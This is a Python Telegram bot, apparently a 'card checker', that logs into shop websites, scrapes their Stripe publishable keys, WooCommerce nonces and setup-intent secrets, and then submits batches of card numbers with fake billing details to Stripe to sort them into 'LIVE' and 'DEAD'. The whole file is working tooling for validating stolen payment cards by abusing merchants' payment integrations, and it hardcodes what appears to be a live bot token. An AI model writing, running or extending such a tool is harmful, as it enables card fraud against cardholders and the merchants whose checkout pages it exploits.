import logging
import aiohttp
import asyncio
import re
import json
import random
import io
from datetime import datetime, timezone
from typing import Optional, Dict, Any, Tuple, List
from bs4 import BeautifulSoup

from telegram import Update, InputFile
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode
from telegram.helpers import escape_markdown

# ================================
# Configuration
# ================================

BOT_TOKEN = "7879139068:AAH7uF2SdHehipms3nAJakQZpulUpqFPu7M"

# Logging Configuration
logging.basicConfig(
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ================================
# HTTP Client Manager
# ================================

class HttpClient:
    """Centralized HTTP client with proper headers and session management"""
    
    @staticmethod
    def get_headers(target_url: str = None, referer: str = None) -> Dict[str, str]:
        """Generate browser-like headers for requests"""
        authority = "example.com"
        
        if target_url:
            try:
                from urllib.parse import urlparse
                parsed = urlparse(target_url)
                authority = parsed.netloc or authority
            except:
                pass
        
        if not referer and target_url:
            try:
                from urllib.parse import urlparse
                parsed = urlparse(target_url)
                referer = f"{parsed.scheme}://{parsed.netloc}/"
            except:
                referer = "https://google.com"
        
        return {
            "authority": authority,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "sec-ch-ua": '"Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin" if referer and authority in referer else "cross-site",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "referer": referer or "https://google.com",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36"
        }

# ================================
# Message Utilities
# ================================

async def safe_reply(update: Update, text: str, parse_mode: str = ParseMode.MARKDOWN_V2) -> Any:
    """Send a reply with automatic fallback to plain text if markdown fails"""
    message = update.message or (update.callback_query.message if update.callback_query else None)
    
    if not message:
        logger.error("Could not determine message object for reply")
        return None
    
    try:
        return await message.reply_text(text, parse_mode=parse_mode)
    except Exception as e:
        logger.warning(f"Markdown parsing failed: {e}")
        try:
            return await message.reply_text(text, parse_mode=None)
        except Exception as e2:
            logger.error(f"Failed to send even plain text: {e2}")
            return None

def format_card_display(cc: str) -> str:
    """Format card number for display (first 6 and last 4 digits)"""
    if len(cc) < 10:
        return cc
    return f"{cc[:6]}{'•' * (len(cc) - 10)}{cc[-4:]}"

# ================================
# External API Services
# ================================

class BinService:
    """Service for BIN lookups"""
    
    @staticmethod
    async def lookup(bin_number: str) -> Dict[str, Any]:
        """Lookup BIN information"""
        if not bin_number or len(bin_number) < 6:
            return {"error": "Invalid BIN"}
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    f"https://lookup.binlist.net/{bin_number[:6]}",
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as response:
                    if response.status == 404:
                        return {"error": "BIN not found"}
                    elif response.status == 429:
                        return {"error": "Rate limited"}
                    elif response.status != 200:
                        return {"error": f"HTTP {response.status}"}
                    
                    data = await response.json()
                    return {
                        "scheme": data.get("scheme", "N/A").upper(),
                        "type": data.get("type", "N/A").upper(),
                        "brand": data.get("brand", "N/A").upper(),
                        "country": data.get("country", {}).get("name", "N/A"),
                        "bank": data.get("bank", {}).get("name", "N/A")
                    }
        except asyncio.TimeoutError:
            return {"error": "Timeout"}
        except Exception as e:
            logger.error(f"BIN lookup failed: {e}")
            return {"error": "Lookup failed"}

# ================================
# Site Authentication Service
# ================================

class SiteAuthService:
    """Handle website login operations"""
    
    @staticmethod
    async def login(url: str, username: str, password: str) -> Tuple[Optional[aiohttp.ClientSession], Dict[str, Any]]:
        """Perform website login and return session + metadata"""
        result = {
            "success": False,
            "base_url": None,
            "final_url": url,
            "error": None,
            "session": None
        }
        
        try:
            from urllib.parse import urlparse
            parsed = urlparse(url)
            result["base_url"] = f"{parsed.scheme}://{parsed.netloc}"
            
            session = aiohttp.ClientSession()
            headers = HttpClient.get_headers(url)
            
            # Get login page
            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=25)) as response:
                result["final_url"] = str(response.url)
                page_text = await response.text()
            
            soup = BeautifulSoup(page_text, "html.parser")
            
            # Find nonce/CSRF token
            nonce = None
            nonce_fields = ["woocommerce-login-nonce", "_wpnonce", "csrf_token", "_token"]
            for field in nonce_fields:
                element = soup.find("input", {"name": field}) or soup.find("input", {"id": field})
                if element and element.get("value"):
                    nonce = element["value"]
                    break
            
            # Find form action URL
            form_action = url
            login_form = (
                soup.find("form", {"id": "loginform"}) or
                soup.find("form", class_=re.compile(r"login|signin", re.I)) or
                soup.find("form", action=re.compile(r"login", re.I))
            )
            
            if login_form and login_form.get("action"):
                from urllib.parse import urljoin
                form_action = urljoin(url, login_form["action"])
            
            # Build login data
            data = {
                "redirect_to": url,
                "testcookie": "1"
            }
            
            # Username field
            username_fields = ["log", "username", "email", "user_login", "user[email]"]
            for field in username_fields:
                if soup.find("input", {"name": field}):
                    data[field] = username
                    break
            else:
                data["username"] = username
            
            # Password field
            password_fields = ["pwd", "password", "user_password", "user[password]"]
            for field in password_fields:
                if soup.find("input", {"name": field}):
                    data[field] = password
                    break
            else:
                data["password"] = password
            
            # Add nonce if found
            if nonce:
                nonce_field = soup.find("input", {"value": nonce})
                if nonce_field and nonce_field.get("name"):
                    data[nonce_field["name"]] = nonce
                else:
                    data["_wpnonce"] = nonce
            
            # Submit login
            headers = HttpClient.get_headers(form_action, url)
            async with session.post(
                form_action, 
                data=data, 
                headers=headers,
                allow_redirects=True,
                timeout=aiohttp.ClientTimeout(total=25)
            ) as response:
                result["final_url"] = str(response.url)
                response_text = await response.text()
            
            # Check if login was successful
            response_lower = response_text.lower()
            success_indicators = ["logout", "sign out", "dashboard", "my account", "profile"]
            failure_indicators = ["invalid", "incorrect", "error", "failed", "wrong"]
            
            is_success = any(indicator in response_lower for indicator in success_indicators)
            has_error = any(indicator in response_lower for indicator in failure_indicators)
            
            if is_success and not has_error:
                result["success"] = True
                result["session"] = session
            else:
                await session.close()
                error_msg = "Login failed - invalid credentials"
                
                # Try to extract specific error message
                error_soup = BeautifulSoup(response_text, "html.parser")
                error_elem = error_soup.find(class_=re.compile(r"error|alert|warning", re.I))
                if error_elem:
                    error_msg = error_elem.get_text(strip=True)[:100]
                
                result["error"] = error_msg
            
            return session if result["success"] else None, result
            
        except asyncio.TimeoutError:
            result["error"] = "Connection timeout"
            if session:
                await session.close()
            return None, result
        except Exception as e:
            logger.error(f"Login error: {e}")
            result["error"] = f"Login failed: {str(e)[:50]}"
            if session:
                await session.close()
            return None, result

# ================================
# Stripe Service
# ================================

class StripeService:
    """Handle all Stripe-related operations"""
    
    @staticmethod
    async def extract_payment_details(session: aiohttp.ClientSession, url: str, referer: str) -> Dict[str, Any]:
        """Extract Stripe configuration from payment page"""
        details = {
            "stripe_pk": None,
            "api_type": "unknown",
            "client_secret": None,
            "wc_nonce": None,
            "wc_ajax_url": None,
            "error": None
        }
        
        try:
            headers = HttpClient.get_headers(url, referer)
            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=20)) as response:
                page_text = await response.text()
            
            # Extract Stripe publishable key
            pk_patterns = [
                r'pk_(?:live|test)_[a-zA-Z0-9]{24,}',
                r'"pk_(?:live|test)_[a-zA-Z0-9]+"',
                r"'pk_(?:live|test)_[a-zA-Z0-9]+'"
            ]
            
            for pattern in pk_patterns:
                match = re.search(pattern, page_text)
                if match:
                    details["stripe_pk"] = match.group().strip('"\'')
                    break
            
            soup = BeautifulSoup(page_text, "html.parser")
            
            # Check for WooCommerce integration
            wc_script = soup.find('script', {'id': re.compile(r'wc-stripe.*js-extra', re.I)})
            if wc_script and wc_script.string:
                nonce_match = re.search(r'"[^"]*Nonce":"([a-zA-Z0-9]+)"', wc_script.string)
                if nonce_match:
                    details["wc_nonce"] = nonce_match.group(1)
                    
                    from urllib.parse import urlparse
                    parsed = urlparse(url)
                    base = f"{parsed.scheme}://{parsed.netloc}"
                    details["wc_ajax_url"] = f"{base}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent"
                    details["api_type"] = "setup_intent"
            
            # Check for client secret
            secret_pattern = r'seti_[a-zA-Z0-9]+_secret_[a-zA-Z0-9]+'
            secret_match = re.search(secret_pattern, page_text)
            if secret_match:
                details["client_secret"] = secret_match.group()
                if details["api_type"] == "unknown":
                    details["api_type"] = "setup_intent"
            
            # Fallback API type detection
            if details["api_type"] == "unknown" and details["stripe_pk"]:
                if "stripe.js" in page_text.lower() or "stripe.elements" in page_text.lower():
                    details["api_type"] = "payment_method"
            
            return details
            
        except Exception as e:
            logger.error(f"Payment page extraction error: {e}")
            details["error"] = str(e)[:100]
            return details
    
    @staticmethod
    async def create_payment_method(stripe_pk: str, card: Dict[str, str], email: str) -> Dict[str, Any]:
        """Create Stripe PaymentMethod"""
        result = {
            "success": False,
            "pm_id": None,
            "message": "Unknown error",
            "decline_code": None,
            "raw_response": {}
        }
        
        try:
            # Generate billing details
            name_parts = email.split('@')[0].split('.')
            first_name = name_parts[0].capitalize() if name_parts else "Test"
            last_name = name_parts[1].capitalize() if len(name_parts) > 1 else "User"
            
            headers = {
                "Accept": "application/json",
                "Content-Type": "application/x-www-form-urlencoded",
                "Authorization": f"Bearer {stripe_pk}",
                "User-Agent": HttpClient.get_headers()["user-agent"]
            }
            
            data = {
                "type": "card",
                "card[number]": card["cc"],
                "card[cvc]": card["cvv"],
                "card[exp_month]": card["mm"],
                "card[exp_year]": card["yy"] if len(card["yy"]) == 4 else f"20{card['yy']}",
                "billing_details[name]": f"{first_name} {last_name}",
                "billing_details[email]": email,
                "billing_details[address][line1]": "123 Test Street",
                "billing_details[address][city]": "Test City",
                "billing_details[address][state]": "NY",
                "billing_details[address][postal_code]": str(random.randint(10000, 99999)),
                "billing_details[address][country]": "US",
                "guid": "NA",
                "muid": "NA",
                "sid": "NA",
                "payment_user_agent": f"stripe.js/v3_{int(datetime.now().timestamp())}",
                "time_on_page": str(random.randint(20000, 45000))
            }
            
            async with aiohttp.ClientSession() as temp_session:
                async with temp_session.post(
                    "https://api.stripe.com/v1/payment_methods",
                    headers=headers,
                    data=data,
                    timeout=aiohttp.ClientTimeout(total=30)
                ) as response:
                    json_response = await response.json()
                    result["raw_response"] = json_response
                    
                    if response.status >= 400 or "error" in json_response:
                        error = json_response.get("error", {})
                        result["message"] = error.get("message", "PaymentMethod creation failed")
                        result["decline_code"] = error.get("decline_code")
                    else:
                        result["success"] = True
                        result["pm_id"] = json_response.get("id")
                        result["message"] = "PaymentMethod created successfully"
            
            return result
            
        except Exception as e:
            logger.error(f"PaymentMethod creation error: {e}")
            result["message"] = f"API error: {str(e)[:50]}"
            return result
    
    @staticmethod
    async def confirm_setup_intent(
        session: aiohttp.ClientSession,
        stripe_pk: str,
        pm_id: str,
        details: Dict[str, Any],
        email: str,
        referer: str
    ) -> Dict[str, Any]:
        """Confirm SetupIntent with PaymentMethod"""
        result = {
            "success": False,
            "intent_id": None,
            "message": "No confirmation attempted",
            "method_used": None
        }
        
        # Try WooCommerce AJAX first
        if details.get("wc_nonce") and details.get("wc_ajax_url"):
            try:
                result["method_used"] = "WooCommerce AJAX"
                
                from urllib.parse import urlparse
                parsed = urlparse(referer)
                origin = f"{parsed.scheme}://{parsed.netloc}"
                
                headers = {
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Accept": "*/*",
                    "X-Requested-With": "XMLHttpRequest",
                    "Referer": referer,
                    "Origin": origin,
                    "User-Agent": HttpClient.get_headers()["user-agent"]
                }
                
                data = {
                    "action": "wc_stripe_create_and_confirm_setup_intent",
                    "wc-stripe-payment-method": pm_id,
                    "wc-stripe-payment-type": "card",
                    "_ajax_nonce": details["wc_nonce"],
                    "email": email
                }
                
                async with session.post(
                    details["wc_ajax_url"],
                    headers=headers,
                    data=data,
                    timeout=aiohttp.ClientTimeout(total=35)
                ) as response:
                    json_response = await response.json()
                    
                    if json_response.get("success") or \
                       (isinstance(json_response.get("data"), dict) and 
                        json_response["data"].get("status") == "succeeded"):
                        result["success"] = True
                        result["intent_id"] = json_response.get("data", {}).get("id")
                        result["message"] = "SetupIntent confirmed via WooCommerce"
                    else:
                        result["message"] = json_response.get("data", "WooCommerce confirmation failed")
                        
            except Exception as e:
                logger.error(f"WooCommerce confirmation error: {e}")
                result["message"] = f"WooCommerce error: {str(e)[:50]}"
        
        # Try direct Stripe API if WooCommerce failed and we have client_secret
        if not result["success"] and details.get("client_secret"):
            try:
                result["method_used"] = "Direct Stripe API"
                
                intent_id = details["client_secret"].split("_secret_")[0]
                
                headers = {
                    "Accept": "application/json",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Authorization": f"Bearer {stripe_pk}",
                    "User-Agent": HttpClient.get_headers()["user-agent"]
                }
                
                from urllib.parse import urlparse
                parsed = urlparse(referer)
                return_url = f"{parsed.scheme}://{parsed.netloc}/stripe_return"
                
                data = {
                    "payment_method": pm_id,
                    "client_secret": details["client_secret"],
                    "return_url": return_url
                }
                
                async with aiohttp.ClientSession() as temp_session:
                    async with temp_session.post(
                        f"https://api.stripe.com/v1/setup_intents/{intent_id}/confirm",
                        headers=headers,
                        data=data,
                        timeout=aiohttp.ClientTimeout(total=30)
                    ) as response:
                        json_response = await response.json()
                        
                        if "error" in json_response:
                            result["message"] = json_response["error"].get("message", "Direct API failed")
                        else:
                            status = json_response.get("status")
                            result["intent_id"] = json_response.get("id")
                            
                            if status == "succeeded":
                                result["success"] = True
                                result["message"] = "SetupIntent confirmed via Direct API"
                            else:
                                result["message"] = f"SetupIntent status: {status}"
                                
            except Exception as e:
                logger.error(f"Direct API confirmation error: {e}")
                result["message"] = f"Direct API error: {str(e)[:50]}"
        
        return result

# ================================
# Card Validation
# ================================

def validate_card(cc: str, mm: str, yy: str, cvv: str) -> Tuple[bool, str]:
    """Validate card details format"""
    try:
        # Check card number
        if not cc.isdigit() or not (13 <= len(cc) <= 19):
            return False, "Invalid card number length"
        
        # Check month
        if not mm.isdigit() or not (1 <= int(mm) <= 12):
            return False, "Invalid month"
        
        # Check year
        year = int(yy) if len(yy) == 4 else int(f"20{yy}")
        current_year = datetime.now().year
        current_month = datetime.now().month
        
        if year < current_year or (year == current_year and int(mm) < current_month):
            return False, "Card expired"
        
        # Check CVV
        if not cvv.isdigit() or not (3 <= len(cvv) <= 4):
            return False, "Invalid CVV"
        
        return True, "Valid"
        
    except ValueError:
        return False, "Invalid card format"

# ================================
# Bot Command Handlers
# ================================

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    user = update.effective_user
    welcome = (
        f"👋 *Welcome {escape_markdown(user.first_name or 'User', version=2)}\\!*\n\n"
        "🤖 *Stripe Pre\\-Auth Bot Ready*\n\n"
        "━━━━━━━━━━━━━━━\n"
        "*Quick Start Guide:*\n"
        "1️⃣ `/addsitelogin` \\- Setup website\n"
        "2️⃣ `/chk` \\- Check single card\n"
        "3️⃣ `/mchk` \\- Batch check cards\n"
        "━━━━━━━━━━━━━━━\n\n"
        "Type `/help` for detailed instructions"
    )
    
    context.user_data.clear()
    await safe_reply(update, welcome)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /help command"""
    help_text = (
        "📚 *COMPLETE GUIDE*\n"
        "━━━━━━━━━━━━━━━\n\n"
        "*Step 1: Website Setup*\n"
        "└ `/addsitelogin`\n"
        "   Send: `URL|email|password`\n\n"
        "*Step 2: Payment Page*\n"
        "└ After login, send payment page URL\n\n"
        "*Step 3: Check Cards*\n"
        "└ `/chk CC|MM|YY|CVV` \\- Single\n"
        "└ `/mchk` \\+ file \\- Multiple\n\n"
        "━━━━━━━━━━━━━━━\n"
        "*Examples:*\n"
        "• Site: `https://site\\.com/login|user@mail|pass123`\n"
        "• Card: `/chk 4242424242424242|12|25|123`\n"
        "• File: Each line `CC|MM|YY|CVV`\n\n"
        "⚠️ *Use test cards only\\!*"
    )
    
    await safe_reply(update, help_text)

async def addsitelogin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /addsitelogin command"""
    context.user_data.clear()
    
    prompt = (
        "🔐 *WEBSITE LOGIN SETUP*\n"
        "━━━━━━━━━━━━━━━\n\n"
        "Send your login details:\n"
        "`LOGIN_URL|EMAIL|PASSWORD`\n\n"
        "*Example:*\n"
        "`https://shop\\.com/account|user@email\\.com|pass123`"
    )
    
    context.user_data["state"] = "awaiting_login"
    await safe_reply(update, prompt)

async def handle_login_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process login credentials"""
    text = update.message.text.strip()
    
    if text.count('|') != 2:
        await safe_reply(update, "❌ Wrong format\\! Use: `URL|email|password`")
        return
    
    url, username, password = [part.strip() for part in text.split('|')]
    
    if not url.startswith(('http://', 'https://')):
        await safe_reply(update, "❌ URL must start with http:// or https://")
        return
    
    status_msg = await update.message.reply_text("🔄 Logging in...")
    
    session, result = await SiteAuthService.login(url, username, password)
    
    if not session:
        error_text = (
            f"❌ *LOGIN FAILED*\n\n"
            f"Error: {escape_markdown(result.get('error', 'Unknown'), version=2)}\n\n"
            f"Try `/addsitelogin` again"
        )
        await status_msg.edit_text(error_text, parse_mode=ParseMode.MARKDOWN_V2)
        context.user_data.clear()
        return
    
    # Store session data
    context.user_data.update({
        "session": session,
        "base_url": result["base_url"],
        "email": username,
        "current_url": result["final_url"],
        "state": "awaiting_payment_url"
    })
    
    success_text = (
        "✅ *LOGIN SUCCESSFUL*\n\n"
        "Now send the payment page URL\n"
        "Example: `https://shop\\.com/add\\-payment\\-method`"
    )
    
    await status_msg.edit_text(success_text, parse_mode=ParseMode.MARKDOWN_V2)

async def handle_payment_url_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process payment page URL"""
    url = update.message.text.strip()
    
    if not url.startswith(('http://', 'https://')):
        await safe_reply(update, "❌ URL must start with http:// or https://")
        return
    
    session = context.user_data.get("session")
    if not session:
        await safe_reply(update, "❌ Session expired\\! Start over with `/addsitelogin`")
        context.user_data.clear()
        return
    
    status_msg = await update.message.reply_text("🔍 Scanning payment page...")
    
    details = await StripeService.extract_payment_details(
        session, url, context.user_data.get("current_url", url)
    )
    
    if details.get("error"):
        await status_msg.edit_text(
            f"❌ Error: {escape_markdown(details['error'], version=2)}",
            parse_mode=ParseMode.MARKDOWN_V2
        )
        return
    
    # Store Stripe details
    context.user_data.update({
        "stripe_pk": details["stripe_pk"],
        "api_type": details["api_type"],
        "client_secret": details["client_secret"],
        "wc_nonce": details["wc_nonce"],
        "wc_ajax_url": details["wc_ajax_url"],
        "payment_url": url,
        "state": "ready"
    })
    
    # Build status message
    status_parts = ["✅ *SETUP COMPLETE*\n━━━━━━━━━━━━━━━\n"]
    
    if details["stripe_pk"]:
        pk_display = details["stripe_pk"][:20] + "..." if len(details["stripe_pk"]) > 20 else details["stripe_pk"]
        status_parts.append(f"🔑 PK: `{escape_markdown(pk_display, version=2)}`")
    else:
        status_parts.append("🔑 PK: ❌ Not found")
    
    status_parts.append(f"📡 Type: `{escape_markdown(details['api_type'], version=2)}`")
    
    if details["wc_nonce"]:
        status_parts.append(f"🔧 WC Nonce: ✅ Found")
    
    if details["client_secret"]:
        status_parts.append(f"🔒 Secret: ✅ Found")
    
    status_parts.append("\n━━━━━━━━━━━━━━━\n*Ready for checks\\!*\n")
    status_parts.append("• `/chk CC|MM|YY|CVV`\n• `/mchk` \\+ file")
    
    await status_msg.edit_text("\n".join(status_parts), parse_mode=ParseMode.MARKDOWN_V2)

async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle single card check"""
    # Check if setup is complete
    if context.user_data.get("state") != "ready":
        await safe_reply(update, "⚠️ Setup required\\! Use `/addsitelogin` first")
        return
    
    # Parse card from command
    text = update.message.text.strip()
    if text.lower() == "/chk":
        await safe_reply(update, "Usage: `/chk CC|MM|YY|CVV`")
        return
    
    card_str = text[4:].strip() if text.lower().startswith("/chk ") else text
    
    if card_str.count('|') != 3:
        await safe_reply(update, "❌ Format: `CC|MM|YY|CVV`")
        return
    
    cc, mm, yy, cvv = [part.strip() for part in card_str.split('|')]
    
    # Validate card
    is_valid, error = validate_card(cc, mm, yy, cvv)
    if not is_valid:
        await safe_reply(update, f"❌ {escape_markdown(error, version=2)}")
        return
    
    status_msg = await update.message.reply_text(
        f"💳 Checking {format_card_display(cc)}..."
    )
    
    # Get BIN info
    bin_info = await BinService.lookup(cc[:6])
    
    # Create PaymentMethod
    pm_result = await StripeService.create_payment_method(
        context.user_data["stripe_pk"],
        {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv},
        context.user_data["email"]
    )
    
    # Attempt SetupIntent confirmation if PM succeeded
    intent_result = {"success": False, "message": "Not attempted"}
    
    if pm_result["success"] and context.user_data.get("api_type") == "setup_intent":
        intent_result = await StripeService.confirm_setup_intent(
            context.user_data["session"],
            context.user_data["stripe_pk"],
            pm_result["pm_id"],
            context.user_data,
            context.user_data["email"],
            context.user_data["payment_url"]
        )
    
    # Determine final status
    if intent_result["success"]:
        status = "✅ LIVE"
        details = "SetupIntent Confirmed"
    elif pm_result["success"]:
        status = "✅ LIVE"
        details = "PaymentMethod Created"
    else:
        status = "❌ DEAD"
        details = pm_result["message"]
    
    # Format response
    response_parts = [
        f"━━━━━━━━━━━━━━━",
        f"💳 *CARD CHECK RESULT*",
        f"━━━━━━━━━━━━━━━\n",
        f"Card: `{escape_markdown(f'{cc}|{mm}|{yy}|{cvv}', version=2)}`",
        f"Status: *{escape_markdown(status, version=2)}*",
        f"Message: `{escape_markdown(details[:50], version=2)}`\n"
    ]
    
    # Add BIN info
    if not bin_info.get("error"):
        response_parts.extend([
            f"*BIN Information:*",
            f"• Type: {escape_markdown(bin_info.get('type', 'N/A'), version=2)}",
            f"• Brand: {escape_markdown(bin_info.get('brand', 'N/A'), version=2)}",
            f"• Bank: {escape_markdown(bin_info.get('bank', 'N/A'), version=2)}",
            f"• Country: {escape_markdown(bin_info.get('country', 'N/A'), version=2)}\n"
        ])
    
    # Add technical details
    if pm_result.get("pm_id"):
        response_parts.append(f"PM ID: `{escape_markdown(pm_result['pm_id'], version=2)}`")
    
    if intent_result.get("intent_id"):
        response_parts.append(f"Intent: `{escape_markdown(intent_result['intent_id'], version=2)}`")
    
    if pm_result.get("decline_code"):
        response_parts.append(f"Decline: `{escape_markdown(pm_result['decline_code'], version=2)}`")
    
    response_parts.extend([
        f"\n━━━━━━━━━━━━━━━",
        f"Time: {escape_markdown(datetime.now(timezone.utc).strftime('%H:%M:%S UTC'), version=2)}",
        f"By: @{escape_markdown(update.effective_user.username or 'User', version=2)}"
    ])
    
    await status_msg.edit_text("\n".join(response_parts), parse_mode=ParseMode.MARKDOWN_V2)

async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle batch card check"""
    # Check setup
    if context.user_data.get("state") != "ready":
        await safe_reply(update, "⚠️ Setup required\\! Use `/addsitelogin` first")
        return
    
    # Check for file
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await safe_reply(update, "📎 Reply to a \\.txt file with `/mchk`")
        return
    
    doc = update.message.reply_to_message.document
    if doc.mime_type != "text/plain":
        await safe_reply(update, "❌ File must be \\.txt format")
        return
    
    # Download file
    try:
        file = await context.bot.get_file(doc.file_id)
        content = await file.download_as_bytearray()
        lines = content.decode('utf-8').splitlines()
    except Exception as e:
        await safe_reply(update, f"❌ Error reading file: {escape_markdown(str(e)[:50], version=2)}")
        return
    
    # Filter valid lines
    valid_lines = [l.strip() for l in lines if l.strip() and not l.strip().startswith('#')]
    
    if not valid_lines:
        await safe_reply(update, "❌ File is empty or has no valid lines")
        return
    
    status_msg = await update.message.reply_text(
        f"🔄 Processing {len(valid_lines)} cards..."
    )
    
    results = []
    live_count = 0
    
    for i, line in enumerate(valid_lines):
        # Update progress
        if i % 5 == 0:
            try:
                await status_msg.edit_text(
                    f"🔄 Progress: {i}/{len(valid_lines)}\n"
                    f"✅ Live: {live_count}"
                )
            except:
                pass
        
        # Parse card
        if line.count('|') != 3:
            results.append(f"{line} -> ❌ Invalid format")
            continue
        
        cc, mm, yy, cvv = [p.strip() for p in line.split('|')]
        
        # Validate
        is_valid, error = validate_card(cc, mm, yy, cvv)
        if not is_valid:
            results.append(f"{line} -> ❌ {error}")
            continue
        
        # Check card
        pm_result = await StripeService.create_payment_method(
            context.user_data["stripe_pk"],
            {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv},
            context.user_data["email"]
        )
        
        if pm_result["success"]:
            if context.user_data.get("api_type") == "setup_intent":
                intent_result = await StripeService.confirm_setup_intent(
                    context.user_data["session"],
                    context.user_data["stripe_pk"],
                    pm_result["pm_id"],
                    context.user_data,
                    context.user_data["email"],
                    context.user_data["payment_url"]
                )
                
                if intent_result["success"]:
                    results.append(f"{line} -> ✅ LIVE (Intent confirmed)")
                    live_count += 1
                else:
                    results.append(f"{line} -> ❌ DEAD ({intent_result['message'][:30]})")
            else:
                results.append(f"{line} -> ✅ LIVE (PM created)")
                live_count += 1
        else:
            results.append(f"{line} -> ❌ DEAD ({pm_result['message'][:30]})")
        
        # Small delay to avoid rate limits
        await asyncio.sleep(0.5)
    
    # Final summary
    summary = (
        f"✅ *BATCH COMPLETE*\n"
        f"━━━━━━━━━━━━━━━\n"
        f"Total: {len(valid_lines)}\n"
        f"Live: {live_count}\n"
        f"Dead: {len(valid_lines) - live_count}\n"
        f"━━━━━━━━━━━━━━━"
    )
    
    await status_msg.edit_text(summary, parse_mode=ParseMode.MARKDOWN_V2)
    
    # Send results file
    if results:
        result_text = "\n".join(results)
        result_file = io.BytesIO(result_text.encode('utf-8'))
        await update.message.reply_document(
            document=InputFile(result_file, filename="results.txt"),
            caption="📊 Detailed results attached"
        )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Route text messages based on state"""
    state = context.user_data.get("state")
    text = update.message.text.strip()
    
    if state == "awaiting_login":
        await handle_login_input(update, context)
    elif state == "awaiting_payment_url":
        await handle_payment_url_input(update, context)
    elif state == "ready" and '|' in text and text.count('|') == 3:
        # Allow direct card input when ready
        await chk_command(update, context)
    else:
        await safe_reply(update, "❓ Not sure what to do\\. Try `/help`")

# ================================
# Main Bot Runner
# ================================

def main():
    """Initialize and run the bot"""
    logger.info("Starting Stripe Pre-Auth Bot...")
    
    # Create application
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Register handlers
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("addsitelogin", addsitelogin_command))
    app.add_handler(CommandHandler("chk", chk_command))
    app.add_handler(CommandHandler("mchk", mchk_command))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    # Start bot
    logger.info("Bot is running! Press Ctrl+C to stop.")
    app.run_polling()

if __name__ == "__main__":
    main()
